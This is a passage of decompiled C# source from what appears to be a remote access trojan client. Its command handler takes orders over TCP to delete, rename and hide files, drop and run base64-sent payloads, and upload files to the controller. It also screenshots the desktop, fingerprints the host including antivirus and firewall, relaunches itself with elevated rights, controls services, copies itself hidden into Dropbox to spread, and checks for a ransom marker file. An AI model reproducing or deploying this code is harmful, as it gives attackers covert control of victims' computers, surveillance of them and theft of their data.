					c35.Send(ENB(ref text3) + Y + "Error");
					ProjectData.ClearProjectError();
					break;
				}
			case "Delete":
			{
				string text11 = array[1];
				if (Operators.CompareString(text11, "Folder", false) == 0)
				{
					Directory.Delete(DEB(ref array[2]));
					TCP c28 = C;
					string[] array2 = new string[8];
					string[] array16 = array2;
					string text3 = "MSG";
					array16[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = DEB(ref array[2]);
					array2[3] = " - Has Been Deleted";
					array2[4] = Y;
					array2[5] = "Succ";
					array2[6] = Y;
					array2[7] = "decode";
					c28.Send(string.Concat(array2));
				}
				else if (Operators.CompareString(text11, "File", false) == 0)
				{
					File.Delete(DEB(ref array[2]));
					TCP c29 = C;
					string[] array2 = new string[8];
					string[] array17 = array2;
					string text3 = "MSG";
					array17[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = DEB(ref array[2]);
					array2[3] = " - Has Been Deleted";
					array2[4] = Y;
					array2[5] = "Succ";
					array2[6] = Y;
					array2[7] = "decode";
					c29.Send(string.Concat(array2));
				}
				break;
			}
			case "Execute":
				try
				{
					Process.Start(DEB(ref array[1]));
					break;
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
					break;
				}
			case "Rename":
				try
				{
					string text9 = array[1];
					if (Operators.CompareString(text9, "Folder", false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameDirectory(DEB(ref array[2]), DEB(ref array[3]));
						TCP c25 = C;
						string[] array2 = new string[9];
						string[] array12 = array2;
						string text3 = "MSG";
						array12[0] = ENB(ref text3);
						array2[1] = Y;
						array2[2] = DEB(ref array[2]);
						array2[3] = " - Has Been Renamed To ";
						array2[4] = DEB(ref array[3]);
						array2[5] = Y;
						array2[6] = "Succ";
						array2[7] = Y;
						array2[8] = "decode";
						c25.Send(string.Concat(array2));
					}
					else if (Operators.CompareString(text9, "File", false) == 0)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(DEB(ref array[2]), DEB(ref array[3]));
						TCP c26 = C;
						string[] array2 = new string[9];
						string[] array13 = array2;
						string text3 = "MSG";
						array13[0] = ENB(ref text3);
						array2[1] = Y;
						array2[2] = DEB(ref array[2]);
						array2[3] = " - Has Been Renamed To ";
						array2[4] = DEB(ref array[3]);
						array2[5] = Y;
						array2[6] = "Succ";
						array2[7] = Y;
						array2[8] = "decode";
						c26.Send(string.Concat(array2));
					}
					break;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					TCP c27 = C;
					string[] array2 = new string[7];
					string[] array14 = array2;
					string text10 = "MSG";
					array14[0] = ENB(ref text10);
					array2[1] = Y;
					string[] array15 = array2;
					string text3 = ex2.Message;
					array15[2] = ENB(ref text3);
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "base";
					c27.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "sendfile":
				File.WriteAllBytes(Path.GetTempPath() + DEB(ref array[1]), Convert.FromBase64String(array[2]));
				Thread.Sleep(1000);
				Process.Start(Path.GetTempPath() + array[1]);
				break;
			case "getdesktoppath":
			{
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				TCP c24 = C;
				string text3 = "getpath";
				c24.Send(ENB(ref text3) + Y + folderPath3 + "\\");
				break;
			}
			case "gettemppath":
			{
				string tempPath = Path.GetTempPath();
				TCP c23 = C;
				string text3 = "getpath";
				c23.Send(ENB(ref text3) + Y + tempPath + "\\");
				break;
			}
			case "getstartuppath":
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				TCP c22 = C;
				string text3 = "getpath";
				c22.Send(ENB(ref text3) + Y + folderPath2 + "\\");
				break;
			}
			case "getmydocumentspath":
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				TCP c21 = C;
				string text3 = "getpath";
				c21.Send(ENB(ref text3) + Y + folderPath + "\\");
				break;
			}
			case "getdrivec":
			{
				string text8 = "C:\\";
				TCP c20 = C;
				string text3 = "getpath";
				c20.Send(ENB(ref text3) + Y + text8);
				break;
			}
			case "getdrived":
			{
				string text7 = "D:\\";
				TCP c19 = C;
				string text3 = "getpath";
				c19.Send(ENB(ref text3) + Y + text7);
				break;
			}
			case "getuserpath":
			{
				string text6 = "C:\\Users\\" + Interaction.Environ("Username");
				TCP c18 = C;
				string text3 = "getpath";
				c18.Send(ENB(ref text3) + Y + text6);
				break;
			}
			case "getsystem32":
			{
				string text5 = "C:\\Windows\\System32";
				TCP c17 = C;
				string text3 = "getpath";
				c17.Send(ENB(ref text3) + Y + text5);
				break;
			}
			case "downloads":
			{
				string text4 = "C:\\Users\\" + Interaction.Environ("Username") + "\\Downloads";
				TCP c16 = C;
				string text3 = "getpath";
				c16.Send(ENB(ref text3) + Y + text4 + "\\");
				break;
			}
			case "creatnewtextfile":
				try
				{
					File.Create(DEB(ref array[1])).Dispose();
					break;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					TCP c15 = C;
					string[] array2 = new string[7];
					string[] array11 = array2;
					string text3 = "MSG";
					array11[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "File Name Already Exists";
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "decode";
					c15.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			case "setaswallpaper":
			{
				string text3 = DEB(ref array[1]);
				SystemParametersInfoA(20, 0, ref text3, 1);
				break;
			}
			case "sendfileto":
				File.WriteAllBytes(DEB(ref array[1]), Convert.FromBase64String(array[2]));
				Thread.Sleep(1000);
				Process.Start(DEB(ref array[1]));
				break;
			case "creatnewfolder":
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(array[1]);
					break;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
					break;
				}
			case "hidefolderfile":
			{
				FileAttribute val3 = (FileAttribute)2;
				try
				{
					FileSystem.SetAttr(DEB(ref array[1]), val3);
					break;
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					break;
				}
			}
			case "showfolderfile":
			{
				FileAttribute val2 = (FileAttribute)0;
				try
				{
					FileSystem.SetAttr(DEB(ref array[1]), val2);
					break;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
					break;
				}
			}
			case "downloadfile":
				try
				{
					FileSender fileSender = new FileSender();
					TCP c14 = C;
					string text3 = "largefile";
					c14.Send(ENB(ref text3));
					fileSender.fullname = DEB(ref array[1]);
					fileSender.Threader();
					break;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					break;
				}
			case "tt":
			{
				TCP c13 = C;
				string text3 = "tt";
				c13.Send(ENB(ref text3));
				break;
			}
			case "openlocation":
			{
				TCP c12 = C;
				string text3 = "ipinfo";
				c12.Send(ENB(ref text3));
				break;
			}
			case "getinfo":
			{
				Image value = CaptureDesktop();
				ImageConverter val = new ImageConverter();
				byte[] inArray = (byte[])((TypeConverter)(object)val).ConvertTo((object?)value, b.GetType());
				TCP c11 = C;
				object[] array9 = new object[1];
				object[] array10 = array9;
				string text3 = "getinfo";
				array10[0] = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(string.Concat(ENB(ref text3) + Y, Environment.UserName), "||"), Gcc()), "||"), ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
					.Replace("Windows", "Win")
					.Replace("®", "")
					.Replace("™", "")
					.Replace("  ", " ")
					.Replace(" Win", "Win")), "||"), GetAntiVirus()), "||"), GetFirewall()), "||"), GetCPU()), "||"), GPU()), (object)"||"), (object)GetSystemRAMSize()), (object)"||"), (object)Convert.ToBase64String(inArray));
				NewLateBinding.LateCall((object)c11, (Type)null, "Send", array9, (string[])null, (Type[])null, (bool[])null, true);
				break;
			}
			case "opengroup":
			{
				TCP c10 = C;
				string text3 = "opengroup";
				c10.Send(ENB(ref text3));
				break;
			}
			case "aGroup":
			{
				MySettingsProperty.Settings.Group = array[1];
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
				TCP c9 = C;
				string text3 = "aGroup";
				c9.Send(ENB(ref text3) + Y + MySettingsProperty.Settings.Group);
				break;
			}
			case "rGroup":
			{
				TCP c8 = C;
				string text3 = "removeg";
				c8.Send(ENB(ref text3) + Y + MySettingsProperty.Settings.Group);
				MySettingsProperty.Settings.Group = "None";
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
				break;
			}
			case "uninstall":
				try
				{
					((ApplicationSettingsBase)MySettingsProperty.Settings).Reset();
					Watcher.StopWatcher(DeleteWatcher: true);
					ED();
					pr(0);
					Exta.DStartup(startUP);
					TCP c6 = C;
					string[] array2 = new string[7];
					string[] array7 = array2;
					string text3 = "MSG";
					array7[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "Client Disconncted";
					array2[3] = Y;
					array2[4] = "Succ";
					array2[5] = Y;
					array2[6] = "decode";
					c6.Send(string.Concat(array2));
					Application.Exit();
					ProjectData.EndApp();
					break;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					TCP c7 = C;
					string[] array2 = new string[7];
					string[] array8 = array2;
					string text3 = "MSG";
					array8[0] = ENB(ref text3);
					array2[1] = Y;
					array2[2] = "Client Disconncted";
					array2[3] = Y;
					array2[4] = "Fail";
					array2[5] = Y;
					array2[6] = "decode";
					c7.Send(string.Concat(array2));
					ProjectData.ClearProjectError();
					break;
				}
			}
		}
	}

	public static void Controller(string name, string func)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		try
		{
			ServiceController val = new ServiceController(name);
			switch (func)
			{
			case "Start":
			{
				val.Start();
				TCP c4 = C;
				string[] array = new string[7];
				string[] array5 = array;
				string text = "MSG";
				array5[0] = ENB(ref text);
				array[1] = Y;
				array[2] = "Service Started";
				array[3] = Y;
				array[4] = "Succ";
				array[5] = Y;
				array[6] = "decode";
				c4.Send(string.Concat(array));
				break;
			}
			case "Stop":
			{
				val.Stop();
				TCP c3 = C;
				string[] array = new string[7];
				string[] array4 = array;
				string text = "MSG";
				array4[0] = ENB(ref text);
				array[1] = Y;
				array[2] = "Service Stopped";
				array[3] = Y;
				array[4] = "Succ";
				array[5] = Y;
				array[6] = "decode";
				c3.Send(string.Concat(array));
				break;
			}
			case "Pause":
			{
				val.Pause();
				TCP c2 = C;
				string[] array = new string[7];
				string[] array3 = array;
				string text = "MSG";
				array3[0] = ENB(ref text);
				array[1] = Y;
				array[2] = "Service Paused";
				array[3] = Y;
				array[4] = "Succ";
				array[5] = Y;
				array[6] = "decode";
				c2.Send(string.Concat(array));
				break;
			}
			case "Resume":
			{
				val.Continue();
				TCP c = C;
				string[] array = new string[7];
				string[] array2 = array;
				string text = "MSG";
				array2[0] = ENB(ref text);
				array[1] = Y;
				array[2] = "Sevice Resumed";
				array[3] = Y;
				array[4] = "Succ";
				array[5] = Y;
				array[6] = "decode";
				c.Send(string.Concat(array));
				break;
			}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			TCP c5 = C;
			string[] array = new string[7];
			string[] array6 = array;
			string text2 = "MSG";
			array6[0] = ENB(ref text2);
			array[1] = Y;
			string[] array7 = array;
			string text = ex2.Message;
			array7[2] = ENB(ref text);
			array[3] = Y;
			array[4] = "Fail";
			array[5] = Y;
			array[6] = "base";
			c5.Send(string.Concat(array));
			ProjectData.ClearProjectError();
		}
	}

	public static object GPU()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		SelectQuery val = new SelectQuery("Win32_VideoController");
		ManagementObjectSearcher val2 = new ManagementObjectSearcher((ObjectQuery)(object)val);
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val2.Get().GetEnumerator();
			if (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				return ((ManagementBaseObject)val3).get_Item("Caption").ToString();
			}
			object result = default(object);
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static void RS(object a, object e)
	{
		try
		{
			TCP c = C;
			string text = "rs";
			string text2 = ENB(ref text);
			string y = Y;
			string text3 = Conversions.ToString(NewLateBinding.LateGet(e, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text4 = ENB(ref text3);
			NewLateBinding.LateSetComplex(e, (Type)null, "Data", new object[1] { text3 }, (string[])null, (Type[])null, true, false);
			c.Send(text2 + y + text4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ex()
	{
		try
		{
			TCP c = C;
			string text = "rsc";
			c.Send(ENB(ref text));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void PRS(object a, object e)
	{
		try
		{
			TCP c = C;
			string text = "prs";
			string text2 = ENB(ref text);
			string y = Y;
			string text3 = Conversions.ToString(NewLateBinding.LateGet(e, (Type)null, "Data", new object[0], (string[])null, (Type[])null, (bool[])null));
			string text4 = ENB(ref text3);
			NewLateBinding.LateSetComplex(e, (Type)null, "Data", new object[1] { text3 }, (string[])null, (Type[])null, true, false);
			c.Send(text2 + y + text4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void pex()
	{
		try
		{
			TCP c = C;
			string text = "prsc";
			c.Send(ENB(ref text));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string DEB(ref string s)
	{
		byte[] bytes = Convert.FromBase64String(s);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void DropBoxSpreadFunc(string FileName)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 142:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0026;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0026:
					num = 3;
					File.Copy(Application.get_ExecutablePath(), "C:\\Users\\" + Environment.UserName + "\\Dropbox\\" + FileName);
					break;
					IL_0009:
					num = 2;
					if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\Dropbox\\"))
					{
						goto end_IL_0001_3;
					}
					goto IL_0026;
					end_IL_0001_2:
					break;
				}
				num = 4;
				File.SetAttributes("C:\\Users\\" + Environment.UserName + "\\Dropbox\\" + FileName, FileAttributes.Hidden);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 142;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void RestartElevated()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = Application.get_ExecutablePath();
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
			TCP c = C;
			string[] array = new string[7];
			string[] array2 = array;
			string text = "MSG";
			array2[0] = ENB(ref text);
			array[1] = Y;
			array[2] = "Client Privileges Has Been Elevated";
			array[3] = Y;
			array[4] = "Succ";
			array[5] = Y;
			array[6] = "decode";
			c.Send(string.Concat(array));
			ProjectData.EndApp();
		}
		catch (Win32Exception projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			TCP c2 = C;
			string[] array = new string[7];
			string[] array3 = array;
			string text = "MSG";
			array3[0] = ENB(ref text);
			array[1] = Y;
			array[2] = "Client Refueses To Elevate";
			array[3] = Y;
			array[4] = "Fail";
			array[5] = Y;
			array[6] = "decode";
			c2.Send(string.Concat(array));
			ProjectData.ClearProjectError();
		}
	}

	public static void UsbVicTim()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 106:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 5:
							goto IL_002a;
						case 6:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 4:
						case 7:
						case 8:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_002a:
					num = 5;
					break;
					IL_001c:
					num = 3;
					spread = "Yes";
					goto end_IL_0001_3;
					IL_0009:
					num = 2;
					if (Application.get_ExecutablePath().EndsWith(exen))
					{
						goto IL_001c;
					}
					goto IL_002a;
					end_IL_0001_2:
					break;
				}
				num = 6;
				spread = "No";
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 106;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string INF()
	{
		string text = ((!MySettingsProperty.Settings.TransferStatus) ? (Name + "_" + HWD() + Y) : (MySettingsProperty.Settings.ID + "_" + HWD() + Y));
		text = text + DEB(ref MTX) + Y;
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		text = text + Gcc() + Y;
		try
		{
			text = text + ((ServerComputer)F).get_Info().get_OSFullName().Replace("©", "")
				.Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win") + Y;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text += "Unknown";
			ProjectData.ClearProjectError();
		}
		text = text + GetCPU() + Y;
		text = text + GetAntiVirus() + Y;
		text = text + GetFirewall() + Y;
		text = text + Ver + Y;
		text = text + "" + Y;
		text = text + ACT() + Y;
		text = text + FR() + Y;
		text = text + spread + Y;
		text = text + check + Y;
		text = ((!File.Exists(Interaction.Environ("Temp") + "\\Ransom.dat")) ? (text + "No" + Y) : (text + "Yes" + Y));
		if (Operators.CompareString(MySettingsProperty.Settings.Group, "None", false) == 0)
		{
			return text + "None" + Y;
		}
		return text + MySettingsProperty.Settings.Group + Y;
	}

	public static string GetCPU()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
			val.Get();
			return ((ManagementBaseObject)val).get_Item("Name").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string FR()
	{
		try
		{
			return ((FileInfo)LO).LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetFirewall()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string checkadmin()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
		{
			return "Administrator";
		}
		return "User";
	}

	public static string GetAntiVirus()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			text.ToString();
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static double GetSystemRAMSize()
	{
		double result = default(double);
		try
		{
			double num = ((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory();
			result = Conversions.ToDouble(Strings.FormatNumber((object)num, 2, (TriState)(-2), (TriState)(-2), (TriState)(-2)));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	public static string HWD()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA_1(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static string ACT()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					return "";
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA_1(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				if (lpdwProcessID != 0)
				{
					try
					{
						return Process.GetProcessById(lpdwProcessID).MainWindowTitle;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = WinTitle;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return WinTitle;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public static string getDrives()
	{
		string text = "";
		foreach (DriveInfo drife in ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives())
		{
			switch (drife.DriveType)
			{
			case DriveType.Fixed:
			{
				string text3 = text;
				string name = drife.Name;
				text = text3 + "[Drive]" + ENB(ref name) + "FileManagerSplitFileManagerSplit";
				break;
			}
			case DriveType.CDRom:
			{
				string text2 = text;
				string name = drife.Name;
				text = text2 + "[CD]" + ENB(ref name) + "FileManagerSplitFileManagerSplit";
				break;
			}
			}
		}
		return text;
	}

	public static string readtext(string l)
	{
		return File.ReadAllText(l);
	}

	public static string getFolders(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
			string text2 = text;
			string name = directoryInfo2.get_Name();
			text = text2 + "[Folder]" + ENB(ref name) + "FileManagerSplitFileManagerSplit";
		}
		return text;
	}

	public static string getFiles(object location)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(location));
		string text = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			string[] array = new string[5] { text, null, null, null, null };
			string name = fileInfo.get_Name();
			array[1] = ENB(ref name);
			array[2] = "FileManagerSplit";
			array[3] = Conversion.Str((object)fileInfo.Length);
			array[4] = "FileManagerSplit";
			text = string.Concat(array);
		}
		return text;
	}

	public static Image CaptureDesktop()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		try
		{
			Rectangle rectangle = default(Rectangle);
			Bitmap val = null;
			Graphics val2 = null;
			rectangle = Screen.get_PrimaryScreen().get_Bounds();
			val = new Bitmap(rectangle.Width, rectangle.Height, (PixelFormat)2498570);
			val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size, (CopyPixelOperation)13369376);
			return (Image)(object)val;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Image result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

	public static string Gcc()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
